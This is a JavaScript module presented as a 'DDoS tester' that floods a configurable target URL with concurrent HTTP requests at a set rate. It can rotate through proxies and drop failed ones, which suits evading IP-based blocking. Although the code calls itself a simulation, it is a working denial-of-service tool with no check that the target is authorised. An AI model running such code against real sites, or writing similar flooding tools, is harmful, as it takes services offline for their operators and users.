const axios = require('axios');
const chalk = require('chalk');
const { ProxyRotator } = require('./proxy_rotator');
const sessionLogger = require('./session_logger');

async function test(config, sessionLog) {
    const { targetUrl, requestCount, concurrentRequests, requestsPerSecond, useProxy, method, payload } = config.ddosTester;
    const results = [];
    let successfulRequests = 0;
    let failedRequests = 0;

    const proxyRotator = useProxy ? new ProxyRotator(config.proxies) : null;
    const intervalMs = Math.floor(1000 / requestsPerSecond);

    sessionLog.push(await sessionLogger.log(config, {
        operation: 'ddos_tester_start',
        details: `Starting DDoS simulation on ${targetUrl} with ${requestCount} requests, ${concurrentRequests} concurrent, at ${requestsPerSecond} req/s`
    }));

    // Function to send a single request
    const sendRequest = async (index) => {
        let axiosInstance = axios;
        if (useProxy) {
            axiosInstance = await proxyRotator.createAxiosWithRotation(config, sessionLog);
        }
        try {
            const response = await axiosInstance({
                method: method || 'GET',
                url: targetUrl,
                data: payload || {},
                timeout: 5000
            });
            successfulRequests++;
            results.push({
                operation: 'ddos_tester',
                target: targetUrl,
                result: `Success (Status: ${response.status})`,
                timestamp: new Date().toISOString(),
                error: ''
            });
            console.log(chalk.cyan(`[DDOS] Request ${index + 1}/${requestCount} -> Success (Status: ${response.status})`));
            sessionLog.push(await sessionLogger.log(config, {
                operation: 'ddos_tester_result',
                details: `Request ${index + 1}: Status ${response.status}`
            }));
        } catch (err) {
            failedRequests++;
            results.push({
                operation: 'ddos_tester',
                target: targetUrl,
                result: 'Failed',
                timestamp: new Date().toISOString(),
                error: err.message
            });
            console.error(chalk.red(`[ERROR] Request ${index + 1}/${requestCount} -> ${err.message}`));
            sessionLog.push(await sessionLogger.log(config, {
                operation: 'ddos_tester_error',
                details: `Request ${index + 1}: Error ${err.message}`
            }));
            if (useProxy && err.code === 'ECONNREFUSED') {
                proxyRotator.markProxyFailed(axiosInstance.defaults.proxy);
            }
        }
    };

    // Send requests in batches
    for (let i = 0; i < requestCount; i += concurrentRequests) {
        const batch = [];
        for (let j = 0; j < concurrentRequests && i + j < requestCount; j++) {
            batch.push(sendRequest(i + j));
        }
        await Promise.all(batch);
        await new Promise(resolve => setTimeout(resolve, intervalMs));
    }

    console.log(chalk.green(`[SUCCESS] DDoS simulation completed: ${successfulRequests} successes, ${failedRequests} failures`));
    return results;
}

module.exports = { test };